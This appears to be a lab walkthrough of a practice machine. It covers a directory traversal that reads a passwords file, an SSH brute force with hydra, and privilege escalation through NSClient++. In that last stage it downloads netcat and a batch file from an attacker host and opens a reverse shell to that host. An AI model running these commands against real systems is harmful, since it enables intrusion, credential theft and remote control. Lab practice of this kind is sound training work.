```
nmap -sS -sC -sV -T5 -Pn 10.10.10.184
```
![image](https://github.com/user-attachments/assets/a313103a-0e86-4faa-8270-9879e148cc2e)

```
ftp 10.10.10.184
anonymous:anonymous
```
![image](https://github.com/user-attachments/assets/0ff21dc1-81f9-4f12-bee4-635f1a249ade)

![image](https://github.com/user-attachments/assets/f43fd30d-1e25-4c7b-86e7-464d674ea2ed)

```
nvms 1000 exploit
https://www.exploit-db.com/exploits/48311
```
![image](https://github.com/user-attachments/assets/f1710fe7-fdf5-40db-912f-6a911580e317)

![image](https://github.com/user-attachments/assets/c04dfb6a-a1bb-4a8c-964b-5cc4b7e7fee5)

```
http://10.10.10.184/Pages/login.htm
/../../../../../../../../../../../../windows/win.ini
```
![image](https://github.com/user-attachments/assets/0d9f6310-4342-4b69-a5a1-8f1eec0b20de)

![image](https://github.com/user-attachments/assets/b489f478-226d-4977-a643-207796c8fa52)

```
/../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt
```
![image](https://github.com/user-attachments/assets/f9cf7130-e0dc-4694-9997-a0d9b03b350f)

```
hydra -v -V -u -L users.txt -P passwords.txt -t 10 -u 10.10.10.184 ssh
```
![image](https://github.com/user-attachments/assets/f17637bf-6d86-4854-a606-d7df15feae19)

![image](https://github.com/user-attachments/assets/3e6601e3-5717-42c0-808b-d9bb2fb60085)

```
ssh Nadine@10.10.10.184
L1k3B1gBut7s@W0rk
```
![image](https://github.com/user-attachments/assets/99007e34-13e4-454b-9abc-137e67d22991)

```
Powershell
whoami /priv
```
![image](https://github.com/user-attachments/assets/4cba395f-a2f2-4bbb-b358-2504e7170d29)

```
searchsploit 'NSClient++'
```
![image](https://github.com/user-attachments/assets/62cd7886-2c6b-4f61-a0bf-2416204811e0)

```
cd "C:\Program Files\NSClient++\“
ew2x6SsGTxjRwXOT
```
![image](https://github.com/user-attachments/assets/017d2e31-134e-4d0f-94f8-d0406f14dd40)

```
https://www.exploit-db.com/exploits/46802
```
![image](https://github.com/user-attachments/assets/d97fcdb8-7f80-4c7d-9679-ad5618af7495)


```
cmd /c "C:\Program Files\NSClient++\nscp.exe" --version
```
![image](https://github.com/user-attachments/assets/6f0008e4-794f-4bb3-a9f0-c23c5364cee0)

```
sshpass -p 'L1k3B1gBut7s@W0rk' ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443
https://127.0.0.1:8443
```
![image](https://github.com/user-attachments/assets/41f170fd-d6b7-42bf-b5e7-dd5388417da5)

![image](https://github.com/user-attachments/assets/f6f02615-74d2-43c6-b446-07f2cd00f4d2)

```
\programdata\nc.exe 10.10.14.7 443 -e cmd
cd C:\programdata\
powershell wget http://10.10.14.7/nc64.exe -outfile nc.exe
powershell wget http://10.10.14.7/shell.bat -outfile shell.bat
```
![image](https://github.com/user-attachments/assets/5e3f3c3e-471a-4802-a430-15906f904a7b)

![image](https://github.com/user-attachments/assets/d7796056-a14b-478e-b774-62dcbd600a69)

```
/settings/external scripts/scripts/df
Command
C:\programdata\shell.bat
```
![image](https://github.com/user-attachments/assets/11e195a2-8a1a-4ee5-a50c-0344f3a8b726)


```
/settings/scheduler/schedules/df_run
Interval
10s
Command
df
```
![image](https://github.com/user-attachments/assets/ea4e2b44-7b07-4168-a276-a2415e865b7f)

![image](https://github.com/user-attachments/assets/135208e6-7467-40bd-b1ec-0325e52e077d)

![image](https://github.com/user-attachments/assets/f0b058aa-a573-44bd-9426-3ae7c18ae066)

```
rlwrap nc -lnvp 443
Trigger with Module - CheckExternalScripts
```
![image](https://github.com/user-attachments/assets/781c07d4-dde6-46e9-8f0d-cddb88a83974)
